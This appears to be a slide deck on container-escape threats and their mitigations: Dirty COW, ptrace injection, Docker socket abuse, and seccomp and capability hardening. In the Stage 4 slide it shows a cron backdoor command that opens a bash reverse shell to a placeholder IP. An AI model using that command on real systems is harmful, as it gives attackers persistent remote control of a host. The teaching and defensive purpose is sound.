The Core Problem

Containers are not Virtual Machines.

They share the underlying physical Host OS Kernel. If an attacker exploits a vulnerability in the host kernel from inside a container, all logical isolation instantly collapses.

Namespace Illusion

PID, NET, and MNT namespaces are just filters, not physical boundaries.

Shared Memory

Memory management (like COW) is handled by the shared host kernel.

The 4-Stage Threat Model

A cascading failure from app compromise to physical host takeover.

  1. Kernel Exploit: Dirty COW (CVE-2016-5195)
  2. Lateral Movement: Ptrace Process Injection
  3. API Hijacking: Docker Daemon Compromise
  4. Persistent Takeover: Host Cron Backdoor

Stage 1: The Kernel Exploit

Action: The attacker triggers the Dirty COW race condition.

By simultaneously calling madvise() and writing to /proc/self/mem, they trick the kernel into overwriting read-only system files.

Impact:

Immediate Privilege Escalation to root inside the container.

$ ./hexaforce_cow --exploit

[!] Racing madvise...
[!] Writing to /proc/self/mem...
[*] Overwriting /usr/bin/passwd
[+] Success!
[+] Container root achieved.

Stage 2 & 3: Lateral & API Hijack

Lateral Movement:

Abusing CAP_SYS_PTRACE across shared PID namespaces to inject malicious shellcode into host daemons.

API Hijacking:

Accessing a carelessly mounted /var/run/docker.sock to gain raw HTTP control over the host's Docker engine.

Stage 4: Persistent Takeover

The final blow to the infrastructure.

Using the hijacked API, the attacker spawns a new sibling container that mounts the host's root physical directory (/).

echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" 
> /mnt/host/etc/cron.d/backdoor

Impact:

Total, persistent compromise of the underlying bare-metal infrastructure.

Stopping the Kernel Exploit

Action: Deploy a custom eBPF Seccomp profile.

By explicitly blocking the madvise system call, the kernel immediately rejects the attacker's request.

Impact:

The Dirty COW race condition is neutralized at the kernel boundary before it can even begin execution.

{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "names": ["madvise"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}

Stopping Lateral Movement

Enforce the Principle of Least Privilege.

  • Drop CAP_SYS_PTRACE to make process injection mathematically impossible.
  • Enforce isolated PID namespaces so host processes are invisible.
  • Use --read-only flags to make filesystems immutable, preventing cron backdoor installations.
docker run --cap-drop=ALL --read-only --security-opt no-new-privileges

Conclusion

"True container security assumes breach and builds immutable boundaries."

Runtime security (Seccomp, Capabilities) must be paired with automated supply chain verification (Trivy + Sigstore) for true DevSecOps.
